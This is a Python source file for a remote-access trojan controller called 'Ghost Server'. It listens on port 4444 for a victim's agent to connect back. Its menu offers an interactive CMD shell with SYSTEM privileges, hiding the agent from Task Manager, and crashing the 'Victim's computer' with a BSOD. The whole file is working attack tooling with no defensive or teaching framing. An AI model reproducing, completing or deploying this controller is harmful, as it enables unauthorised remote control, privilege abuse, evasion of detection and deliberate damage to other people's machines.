import socket
import threading
import sys
import time

# --- Configuration ---
HOST = '0.0.0.0'
PORT = 4444

# --- Shell Output Listener ---
def listen_to_shell(sock):
    """ Runs in background to print whatever CMD sends back """
    while True:
        try:
            data = sock.recv(4096)
            if not data: break
            # Print immediately, no buffering
            print(data.decode(errors='ignore'), end='', flush=True)
        except:
            break

# --- Main Server ---
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(1)
        print(f"[*] Ghost Server listening on port {PORT}...")
        
        client, addr = server.accept()
        print(f"[+] TARGET CONNECTED: {addr[0]}\n")

        # The Main Menu
        print("\n" + "="*30)
        print(" COMMANDS MENU")
        print("="*30)
        print("1 - Use CMD with SYSTEM privileges")
        print("2 - Hide from Task Manager")
        print("3 - BSOD the Victim's computer")
        print("q - Quit")

        while True:
            
            choice = input("\nSelect > ").strip()

            if choice == '1':
                # Send the signal to Agent
                client.send(b'1')
                print("\n[+] Elevating & Spawning Shell... (Type 'exit' to return)\n")
                
                # Start the background listener for CMD output
                t = threading.Thread(target=listen_to_shell, args=(client,))
                t.daemon = True # Kills thread if main program exits
                t.start()

                # Interactive Shell Loop
                while True:
                    cmd = input() # User types command
                    
                    # Send command + newline to Agent
                    try:
                        client.send((cmd + "\n").encode())
                    except:
                        break
                    
                    if cmd.strip() == "exit":
                        time.sleep(1) # Wait for "bye" message
                        break
            
            elif choice == '2':
                client.send(b'2')
                print("[*] Hide command sent.")
                
            elif choice == '3':
                client.send(b'3')
                print("[!] BSOD command sent. Goodbye.")
                
            elif choice == 'q':
                break
            else:
                print("[-] Invalid option.")

    except Exception as e:
        print(f"Server Error: {e}")
    finally:
        server.close()

if __name__ == "__main__":
    start_server()